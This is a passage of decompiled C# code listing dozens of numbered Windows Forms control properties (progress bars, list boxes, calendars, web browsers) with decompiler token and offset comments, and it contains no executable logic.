		// (get) Token: 0x0600049F RID: 1183 RVA: 0x00026ABD File Offset: 0x00024CBD
		// (set) Token: 0x060004A0 RID: 1184 RVA: 0x00026AC5 File Offset: 0x00024CC5
		internal virtual ProgressBar ProgressBar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000243 RID: 579
		// (get) Token: 0x060004A1 RID: 1185 RVA: 0x00026ACE File Offset: 0x00024CCE
		// (set) Token: 0x060004A2 RID: 1186 RVA: 0x00026AD6 File Offset: 0x00024CD6
		internal virtual RadioButton RadioButton4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000244 RID: 580
		// (get) Token: 0x060004A3 RID: 1187 RVA: 0x00026ADF File Offset: 0x00024CDF
		// (set) Token: 0x060004A4 RID: 1188 RVA: 0x00026AE7 File Offset: 0x00024CE7
		internal virtual LinkLabel LinkLabel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000245 RID: 581
		// (get) Token: 0x060004A5 RID: 1189 RVA: 0x00026AF0 File Offset: 0x00024CF0
		// (set) Token: 0x060004A6 RID: 1190 RVA: 0x00026AF8 File Offset: 0x00024CF8
		internal virtual CheckBox CheckBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000246 RID: 582
		// (get) Token: 0x060004A7 RID: 1191 RVA: 0x00026B01 File Offset: 0x00024D01
		// (set) Token: 0x060004A8 RID: 1192 RVA: 0x00026B09 File Offset: 0x00024D09
		internal virtual ComboBox ComboBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000247 RID: 583
		// (get) Token: 0x060004A9 RID: 1193 RVA: 0x00026B12 File Offset: 0x00024D12
		// (set) Token: 0x060004AA RID: 1194 RVA: 0x00026B1A File Offset: 0x00024D1A
		internal virtual Button Button3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000248 RID: 584
		// (get) Token: 0x060004AB RID: 1195 RVA: 0x00026B23 File Offset: 0x00024D23
		// (set) Token: 0x060004AC RID: 1196 RVA: 0x00026B2B File Offset: 0x00024D2B
		internal virtual CheckedListBox CheckedListBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000249 RID: 585
		// (get) Token: 0x060004AD RID: 1197 RVA: 0x00026B34 File Offset: 0x00024D34
		// (set) Token: 0x060004AE RID: 1198 RVA: 0x00026B3C File Offset: 0x00024D3C
		internal virtual ComboBox ComboBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024A RID: 586
		// (get) Token: 0x060004AF RID: 1199 RVA: 0x00026B45 File Offset: 0x00024D45
		// (set) Token: 0x060004B0 RID: 1200 RVA: 0x00026B4D File Offset: 0x00024D4D
		internal virtual MonthCalendar MonthCalendar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024B RID: 587
		// (get) Token: 0x060004B1 RID: 1201 RVA: 0x00026B56 File Offset: 0x00024D56
		// (set) Token: 0x060004B2 RID: 1202 RVA: 0x00026B5E File Offset: 0x00024D5E
		internal virtual MonthCalendar MonthCalendar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024C RID: 588
		// (get) Token: 0x060004B3 RID: 1203 RVA: 0x00026B67 File Offset: 0x00024D67
		// (set) Token: 0x060004B4 RID: 1204 RVA: 0x00026B6F File Offset: 0x00024D6F
		internal virtual LinkLabel LinkLabel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024D RID: 589
		// (get) Token: 0x060004B5 RID: 1205 RVA: 0x00026B78 File Offset: 0x00024D78
		// (set) Token: 0x060004B6 RID: 1206 RVA: 0x00026B80 File Offset: 0x00024D80
		internal virtual ProgressBar ProgressBar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024E RID: 590
		// (get) Token: 0x060004B7 RID: 1207 RVA: 0x00026B89 File Offset: 0x00024D89
		// (set) Token: 0x060004B8 RID: 1208 RVA: 0x00026B91 File Offset: 0x00024D91
		internal virtual LinkLabel LinkLabel6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024F RID: 591
		// (get) Token: 0x060004B9 RID: 1209 RVA: 0x00026B9A File Offset: 0x00024D9A
		// (set) Token: 0x060004BA RID: 1210 RVA: 0x00026BA2 File Offset: 0x00024DA2
		internal virtual ListBox ListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000250 RID: 592
		// (get) Token: 0x060004BB RID: 1211 RVA: 0x00026BAB File Offset: 0x00024DAB
		// (set) Token: 0x060004BC RID: 1212 RVA: 0x00026BB3 File Offset: 0x00024DB3
		internal virtual CheckBox CheckBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000251 RID: 593
		// (get) Token: 0x060004BD RID: 1213 RVA: 0x00026BBC File Offset: 0x00024DBC
		// (set) Token: 0x060004BE RID: 1214 RVA: 0x00026BC4 File Offset: 0x00024DC4
		internal virtual CheckedListBox CheckedListBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000252 RID: 594
		// (get) Token: 0x060004BF RID: 1215 RVA: 0x00026BCD File Offset: 0x00024DCD
		// (set) Token: 0x060004C0 RID: 1216 RVA: 0x00026BD5 File Offset: 0x00024DD5
		internal virtual Button Button4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000253 RID: 595
		// (get) Token: 0x060004C1 RID: 1217 RVA: 0x00026BDE File Offset: 0x00024DDE
		// (set) Token: 0x060004C2 RID: 1218 RVA: 0x00026BE6 File Offset: 0x00024DE6
		internal virtual ProgressBar ProgressBar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000254 RID: 596
		// (get) Token: 0x060004C3 RID: 1219 RVA: 0x00026BEF File Offset: 0x00024DEF
		// (set) Token: 0x060004C4 RID: 1220 RVA: 0x00026BF7 File Offset: 0x00024DF7
		internal virtual ProgressBar ProgressBar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000255 RID: 597
		// (get) Token: 0x060004C5 RID: 1221 RVA: 0x00026C00 File Offset: 0x00024E00
		// (set) Token: 0x060004C6 RID: 1222 RVA: 0x00026C08 File Offset: 0x00024E08
		internal virtual DateTimePicker DateTimePicker5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000256 RID: 598
		// (get) Token: 0x060004C7 RID: 1223 RVA: 0x00026C11 File Offset: 0x00024E11
		// (set) Token: 0x060004C8 RID: 1224 RVA: 0x00026C19 File Offset: 0x00024E19
		internal virtual CheckedListBox CheckedListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000257 RID: 599
		// (get) Token: 0x060004C9 RID: 1225 RVA: 0x00026C22 File Offset: 0x00024E22
		// (set) Token: 0x060004CA RID: 1226 RVA: 0x00026C2A File Offset: 0x00024E2A
		internal virtual ListBox ListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000258 RID: 600
		// (get) Token: 0x060004CB RID: 1227 RVA: 0x00026C33 File Offset: 0x00024E33
		// (set) Token: 0x060004CC RID: 1228 RVA: 0x00026C3B File Offset: 0x00024E3B
		internal virtual DateTimePicker DateTimePicker6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000259 RID: 601
		// (get) Token: 0x060004CD RID: 1229 RVA: 0x00026C44 File Offset: 0x00024E44
		// (set) Token: 0x060004CE RID: 1230 RVA: 0x00026C4C File Offset: 0x00024E4C
		internal virtual ListBox ListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025A RID: 602
		// (get) Token: 0x060004CF RID: 1231 RVA: 0x00026C55 File Offset: 0x00024E55
		// (set) Token: 0x060004D0 RID: 1232 RVA: 0x00026C5D File Offset: 0x00024E5D
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025B RID: 603
		// (get) Token: 0x060004D1 RID: 1233 RVA: 0x00026C66 File Offset: 0x00024E66
		// (set) Token: 0x060004D2 RID: 1234 RVA: 0x00026C6E File Offset: 0x00024E6E
		internal virtual MaskedTextBox MaskedTextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025C RID: 604
		// (get) Token: 0x060004D3 RID: 1235 RVA: 0x00026C77 File Offset: 0x00024E77
		// (set) Token: 0x060004D4 RID: 1236 RVA: 0x00026C7F File Offset: 0x00024E7F
		internal virtual RadioButton RadioButton5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025D RID: 605
		// (get) Token: 0x060004D5 RID: 1237 RVA: 0x00026C88 File Offset: 0x00024E88
		// (set) Token: 0x060004D6 RID: 1238 RVA: 0x00026C90 File Offset: 0x00024E90
		internal virtual PictureBox PictureBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025E RID: 606
		// (get) Token: 0x060004D7 RID: 1239 RVA: 0x00026C99 File Offset: 0x00024E99
		// (set) Token: 0x060004D8 RID: 1240 RVA: 0x00026CA1 File Offset: 0x00024EA1
		internal virtual MaskedTextBox MaskedTextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025F RID: 607
		// (get) Token: 0x060004D9 RID: 1241 RVA: 0x00026CAA File Offset: 0x00024EAA
		// (set) Token: 0x060004DA RID: 1242 RVA: 0x00026CB2 File Offset: 0x00024EB2
		internal virtual WebBrowser WebBrowser3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000260 RID: 608
		// (get) Token: 0x060004DB RID: 1243 RVA: 0x00026CBB File Offset: 0x00024EBB
		// (set) Token: 0x060004DC RID: 1244 RVA: 0x00026CC3 File Offset: 0x00024EC3
		internal virtual TreeView TreeView3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000261 RID: 609
		// (get) Token: 0x060004DD RID: 1245 RVA: 0x00026CCC File Offset: 0x00024ECC
		// (set) Token: 0x060004DE RID: 1246 RVA: 0x00026CD4 File Offset: 0x00024ED4
		internal virtual PictureBox PictureBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000262 RID: 610
		// (get) Token: 0x060004DF RID: 1247 RVA: 0x00026CDD File Offset: 0x00024EDD
		// (set) Token: 0x060004E0 RID: 1248 RVA: 0x00026CE5 File Offset: 0x00024EE5
		internal virtual NumericUpDown NumericUpDown3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000263 RID: 611
		// (get) Token: 0x060004E1 RID: 1249 RVA: 0x00026CEE File Offset: 0x00024EEE
		// (set) Token: 0x060004E2 RID: 1250 RVA: 0x00026CF6 File Offset: 0x00024EF6
		internal virtual ProgressBar ProgressBar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000264 RID: 612
		// (get) Token: 0x060004E3 RID: 1251 RVA: 0x00026CFF File Offset: 0x00024EFF
		// (set) Token: 0x060004E4 RID: 1252 RVA: 0x00026D07 File Offset: 0x00024F07
		internal virtual RadioButton RadioButton6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000265 RID: 613
		// (get) Token: 0x060004E5 RID: 1253 RVA: 0x00026D10 File Offset: 0x00024F10
		// (set) Token: 0x060004E6 RID: 1254 RVA: 0x00026D18 File Offset: 0x00024F18
		internal virtual LinkLabel LinkLabel7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000266 RID: 614
		// (get) Token: 0x060004E7 RID: 1255 RVA: 0x00026D21 File Offset: 0x00024F21
		// (set) Token: 0x060004E8 RID: 1256 RVA: 0x00026D29 File Offset: 0x00024F29
		internal virtual CheckBox CheckBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000267 RID: 615
		// (get) Token: 0x060004E9 RID: 1257 RVA: 0x00026D32 File Offset: 0x00024F32
		// (set) Token: 0x060004EA RID: 1258 RVA: 0x00026D3A File Offset: 0x00024F3A
		internal virtual ComboBox ComboBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000268 RID: 616
		// (get) Token: 0x060004EB RID: 1259 RVA: 0x00026D43 File Offset: 0x00024F43
		// (set) Token: 0x060004EC RID: 1260 RVA: 0x00026D4B File Offset: 0x00024F4B
		internal virtual Button Button5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000269 RID: 617
		// (get) Token: 0x060004ED RID: 1261 RVA: 0x00026D54 File Offset: 0x00024F54
		// (set) Token: 0x060004EE RID: 1262 RVA: 0x00026D5C File Offset: 0x00024F5C
		internal virtual CheckedListBox CheckedListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026A RID: 618
		// (get) Token: 0x060004EF RID: 1263 RVA: 0x00026D65 File Offset: 0x00024F65
		// (set) Token: 0x060004F0 RID: 1264 RVA: 0x00026D6D File Offset: 0x00024F6D
		internal virtual ComboBox ComboBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026B RID: 619
		// (get) Token: 0x060004F1 RID: 1265 RVA: 0x00026D76 File Offset: 0x00024F76
		// (set) Token: 0x060004F2 RID: 1266 RVA: 0x00026D7E File Offset: 0x00024F7E
		internal virtual MonthCalendar MonthCalendar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026C RID: 620
		// (get) Token: 0x060004F3 RID: 1267 RVA: 0x00026D87 File Offset: 0x00024F87
		// (set) Token: 0x060004F4 RID: 1268 RVA: 0x00026D8F File Offset: 0x00024F8F
		internal virtual MonthCalendar MonthCalendar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026D RID: 621
		// (get) Token: 0x060004F5 RID: 1269 RVA: 0x00026D98 File Offset: 0x00024F98
		// (set) Token: 0x060004F6 RID: 1270 RVA: 0x00026DA0 File Offset: 0x00024FA0
		internal virtual LinkLabel LinkLabel8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026E RID: 622
		// (get) Token: 0x060004F7 RID: 1271 RVA: 0x00026DA9 File Offset: 0x00024FA9
		// (set) Token: 0x060004F8 RID: 1272 RVA: 0x00026DB1 File Offset: 0x00024FB1
		internal virtual ProgressBar ProgressBar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700026F RID: 623
		// (get) Token: 0x060004F9 RID: 1273 RVA: 0x00026DBA File Offset: 0x00024FBA
		// (set) Token: 0x060004FA RID: 1274 RVA: 0x00026DC2 File Offset: 0x00024FC2
		internal virtual LinkLabel LinkLabel9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000270 RID: 624
		// (get) Token: 0x060004FB RID: 1275 RVA: 0x00026DCB File Offset: 0x00024FCB
		// (set) Token: 0x060004FC RID: 1276 RVA: 0x00026DD3 File Offset: 0x00024FD3
		internal virtual ListBox ListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000271 RID: 625
		// (get) Token: 0x060004FD RID: 1277 RVA: 0x00026DDC File Offset: 0x00024FDC
		// (set) Token: 0x060004FE RID: 1278 RVA: 0x00026DE4 File Offset: 0x00024FE4
		internal virtual CheckBox CheckBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000272 RID: 626
		// (get) Token: 0x060004FF RID: 1279 RVA: 0x00026DED File Offset: 0x00024FED
		// (set) Token: 0x06000500 RID: 1280 RVA: 0x00026DF5 File Offset: 0x00024FF5
		internal virtual CheckedListBox CheckedListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000273 RID: 627
		// (get) Token: 0x06000501 RID: 1281 RVA: 0x00026DFE File Offset: 0x00024FFE
		// (set) Token: 0x06000502 RID: 1282 RVA: 0x00026E06 File Offset: 0x00025006
		internal virtual Button Button6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000274 RID: 628
		// (get) Token: 0x06000503 RID: 1283 RVA: 0x00026E0F File Offset: 0x0002500F
		// (set) Token: 0x06000504 RID: 1284 RVA: 0x00026E17 File Offset: 0x00025017
		internal virtual ProgressBar ProgressBar13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000275 RID: 629
		// (get) Token: 0x06000505 RID: 1285 RVA: 0x00026E20 File Offset: 0x00025020
		// (set) Token: 0x06000506 RID: 1286 RVA: 0x00026E28 File Offset: 0x00025028
		internal virtual ProgressBar ProgressBar14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000276 RID: 630
		// (get) Token: 0x06000507 RID: 1287 RVA: 0x00026E31 File Offset: 0x00025031
		// (set) Token: 0x06000508 RID: 1288 RVA: 0x00026E39 File Offset: 0x00025039
		internal virtual DateTimePicker DateTimePicker7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000277 RID: 631
		// (get) Token: 0x06000509 RID: 1289 RVA: 0x00026E42 File Offset: 0x00025042
		// (set) Token: 0x0600050A RID: 1290 RVA: 0x00026E4A File Offset: 0x0002504A
		internal virtual CheckedListBox CheckedListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000278 RID: 632
		// (get) Token: 0x0600050B RID: 1291 RVA: 0x00026E53 File Offset: 0x00025053
		// (set) Token: 0x0600050C RID: 1292 RVA: 0x00026E5B File Offset: 0x0002505B
		internal virtual ListBox ListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000279 RID: 633
		// (get) Token: 0x0600050D RID: 1293 RVA: 0x00026E64 File Offset: 0x00025064
		// (set) Token: 0x0600050E RID: 1294 RVA: 0x00026E6C File Offset: 0x0002506C
		internal virtual DateTimePicker DateTimePicker8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027A RID: 634
		// (get) Token: 0x0600050F RID: 1295 RVA: 0x00026E75 File Offset: 0x00025075
		// (set) Token: 0x06000510 RID: 1296 RVA: 0x00026E7D File Offset: 0x0002507D
		internal virtual ListBox ListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027B RID: 635
		// (get) Token: 0x06000511 RID: 1297 RVA: 0x00026E86 File Offset: 0x00025086
		// (set) Token: 0x06000512 RID: 1298 RVA: 0x00026E8E File Offset: 0x0002508E
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027C RID: 636
		// (get) Token: 0x06000513 RID: 1299 RVA: 0x00026E97 File Offset: 0x00025097
		// (set) Token: 0x06000514 RID: 1300 RVA: 0x00026E9F File Offset: 0x0002509F
		internal virtual MaskedTextBox MaskedTextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027D RID: 637
		// (get) Token: 0x06000515 RID: 1301 RVA: 0x00026EA8 File Offset: 0x000250A8
		// (set) Token: 0x06000516 RID: 1302 RVA: 0x00026EB0 File Offset: 0x000250B0
		internal virtual RadioButton RadioButton7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027E RID: 638
		// (get) Token: 0x06000517 RID: 1303 RVA: 0x00026EB9 File Offset: 0x000250B9
		// (set) Token: 0x06000518 RID: 1304 RVA: 0x00026EC1 File Offset: 0x000250C1
		internal virtual PictureBox PictureBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700027F RID: 639
		// (get) Token: 0x06000519 RID: 1305 RVA: 0x00026ECA File Offset: 0x000250CA
		// (set) Token: 0x0600051A RID: 1306 RVA: 0x00026ED2 File Offset: 0x000250D2
		internal virtual MaskedTextBox MaskedTextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000280 RID: 640
		// (get) Token: 0x0600051B RID: 1307 RVA: 0x00026EDB File Offset: 0x000250DB
		// (set) Token: 0x0600051C RID: 1308 RVA: 0x00026EE3 File Offset: 0x000250E3
		internal virtual WebBrowser WebBrowser4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000281 RID: 641
		// (get) Token: 0x0600051D RID: 1309 RVA: 0x00026EEC File Offset: 0x000250EC
		// (set) Token: 0x0600051E RID: 1310 RVA: 0x00026EF4 File Offset: 0x000250F4
		internal virtual TreeView TreeView4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000282 RID: 642
		// (get) Token: 0x0600051F RID: 1311 RVA: 0x00026EFD File Offset: 0x000250FD
		// (set) Token: 0x06000520 RID: 1312 RVA: 0x00026F05 File Offset: 0x00025105
		internal virtual PictureBox PictureBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000283 RID: 643
		// (get) Token: 0x06000521 RID: 1313 RVA: 0x00026F0E File Offset: 0x0002510E
		// (set) Token: 0x06000522 RID: 1314 RVA: 0x00026F16 File Offset: 0x00025116
		internal virtual NumericUpDown NumericUpDown4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000284 RID: 644
		// (get) Token: 0x06000523 RID: 1315 RVA: 0x00026F1F File Offset: 0x0002511F
		// (set) Token: 0x06000524 RID: 1316 RVA: 0x00026F27 File Offset: 0x00025127
		internal virtual ProgressBar ProgressBar15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000285 RID: 645
		// (get) Token: 0x06000525 RID: 1317 RVA: 0x00026F30 File Offset: 0x00025130
		// (set) Token: 0x06000526 RID: 1318 RVA: 0x00026F38 File Offset: 0x00025138
		internal virtual RadioButton RadioButton8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000286 RID: 646
		// (get) Token: 0x06000527 RID: 1319 RVA: 0x00026F41 File Offset: 0x00025141
		// (set) Token: 0x06000528 RID: 1320 RVA: 0x00026F49 File Offset: 0x00025149
		internal virtual LinkLabel LinkLabel10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000287 RID: 647
		// (get) Token: 0x06000529 RID: 1321 RVA: 0x00026F52 File Offset: 0x00025152
		// (set) Token: 0x0600052A RID: 1322 RVA: 0x00026F5A File Offset: 0x0002515A
		internal virtual CheckBox CheckBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000288 RID: 648
		// (get) Token: 0x0600052B RID: 1323 RVA: 0x00026F63 File Offset: 0x00025163
		// (set) Token: 0x0600052C RID: 1324 RVA: 0x00026F6B File Offset: 0x0002516B
		internal virtual ComboBox ComboBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000289 RID: 649
		// (get) Token: 0x0600052D RID: 1325 RVA: 0x00026F74 File Offset: 0x00025174
		// (set) Token: 0x0600052E RID: 1326 RVA: 0x00026F7C File Offset: 0x0002517C
		internal virtual Button Button7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028A RID: 650
		// (get) Token: 0x0600052F RID: 1327 RVA: 0x00026F85 File Offset: 0x00025185
		// (set) Token: 0x06000530 RID: 1328 RVA: 0x00026F8D File Offset: 0x0002518D
		internal virtual CheckedListBox CheckedListBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028B RID: 651
		// (get) Token: 0x06000531 RID: 1329 RVA: 0x00026F96 File Offset: 0x00025196
		// (set) Token: 0x06000532 RID: 1330 RVA: 0x00026F9E File Offset: 0x0002519E
		internal virtual ComboBox ComboBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028C RID: 652
		// (get) Token: 0x06000533 RID: 1331 RVA: 0x00026FA7 File Offset: 0x000251A7
		// (set) Token: 0x06000534 RID: 1332 RVA: 0x00026FAF File Offset: 0x000251AF
		internal virtual MonthCalendar MonthCalendar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028D RID: 653
		// (get) Token: 0x06000535 RID: 1333 RVA: 0x00026FB8 File Offset: 0x000251B8
		// (set) Token: 0x06000536 RID: 1334 RVA: 0x00026FC0 File Offset: 0x000251C0
		internal virtual MonthCalendar MonthCalendar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028E RID: 654
		// (get) Token: 0x06000537 RID: 1335 RVA: 0x00026FC9 File Offset: 0x000251C9
		// (set) Token: 0x06000538 RID: 1336 RVA: 0x00026FD1 File Offset: 0x000251D1
		internal virtual LinkLabel LinkLabel11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700028F RID: 655
		// (get) Token: 0x06000539 RID: 1337 RVA: 0x00026FDA File Offset: 0x000251DA
		// (set) Token: 0x0600053A RID: 1338 RVA: 0x00026FE2 File Offset: 0x000251E2
		internal virtual ProgressBar ProgressBar16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000290 RID: 656
		// (get) Token: 0x0600053B RID: 1339 RVA: 0x00026FEB File Offset: 0x000251EB
		// (set) Token: 0x0600053C RID: 1340 RVA: 0x00026FF3 File Offset: 0x000251F3
		internal virtual LinkLabel LinkLabel12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000291 RID: 657
		// (get) Token: 0x0600053D RID: 1341 RVA: 0x00026FFC File Offset: 0x000251FC
		// (set) Token: 0x0600053E RID: 1342 RVA: 0x00027004 File Offset: 0x00025204
		internal virtual ListBox ListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000292 RID: 658
		// (get) Token: 0x0600053F RID: 1343 RVA: 0x0002700D File Offset: 0x0002520D
		// (set) Token: 0x06000540 RID: 1344 RVA: 0x00027015 File Offset: 0x00025215
		internal virtual CheckBox CheckBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000293 RID: 659
		// (get) Token: 0x06000541 RID: 1345 RVA: 0x0002701E File Offset: 0x0002521E
		// (set) Token: 0x06000542 RID: 1346 RVA: 0x00027026 File Offset: 0x00025226
		internal virtual CheckedListBox CheckedListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000294 RID: 660
		// (get) Token: 0x06000543 RID: 1347 RVA: 0x0002702F File Offset: 0x0002522F
		// (set) Token: 0x06000544 RID: 1348 RVA: 0x00027037 File Offset: 0x00025237
		internal virtual Button Button8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000295 RID: 661
		// (get) Token: 0x06000545 RID: 1349 RVA: 0x00027040 File Offset: 0x00025240
		// (set) Token: 0x06000546 RID: 1350 RVA: 0x00027048 File Offset: 0x00025248
		internal virtual ProgressBar ProgressBar17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000296 RID: 662
		// (get) Token: 0x06000547 RID: 1351 RVA: 0x00027051 File Offset: 0x00025251
		// (set) Token: 0x06000548 RID: 1352 RVA: 0x00027059 File Offset: 0x00025259
		internal virtual ProgressBar ProgressBar18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000297 RID: 663
		// (get) Token: 0x06000549 RID: 1353 RVA: 0x00027062 File Offset: 0x00025262
		// (set) Token: 0x0600054A RID: 1354 RVA: 0x0002706A File Offset: 0x0002526A
		internal virtual DateTimePicker DateTimePicker9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000298 RID: 664
		// (get) Token: 0x0600054B RID: 1355 RVA: 0x00027073 File Offset: 0x00025273
		// (set) Token: 0x0600054C RID: 1356 RVA: 0x0002707B File Offset: 0x0002527B
		internal virtual CheckedListBox CheckedListBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000299 RID: 665
		// (get) Token: 0x0600054D RID: 1357 RVA: 0x00027084 File Offset: 0x00025284
		// (set) Token: 0x0600054E RID: 1358 RVA: 0x0002708C File Offset: 0x0002528C
		internal virtual ListBox ListBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700029A RID: 666
		// (get) Token: 0x0600054F RID: 1359 RVA: 0x00027095 File Offset: 0x00025295
		// (set) Token: 0x06000550 RID: 1360 RVA: 0x0002709D File Offset: 0x0002529D
		internal virtual DateTimePicker DateTimePicker10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700029B RID: 667
		// (get) Token: 0x06000551 RID: 1361 RVA: 0x000270A6 File Offset: 0x000252A6
		// (set) Token: 0x06000552 RID: 1362 RVA: 0x000270AE File Offset: 0x000252AE
		internal virtual ListBox ListBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700029C RID: 668
		// (get) Token: 0x06000553 RID: 1363 RVA: 0x000270B7 File Offset: 0x000252B7
		// (set) Token: 0x06000554 RID: 1364 RVA: 0x000270BF File Offset: 0x000252BF
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700029D RID: 669
		// (get) Token: 0x06000555 RID: 1365 RVA: 0x000270C8 File Offset: 0x000252C8
		// (set) Token: 0x06000556 RID: 1366 RVA: 0x000270D0 File Offset: 0x000252D0
		internal virtual MaskedTextBox MaskedTextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

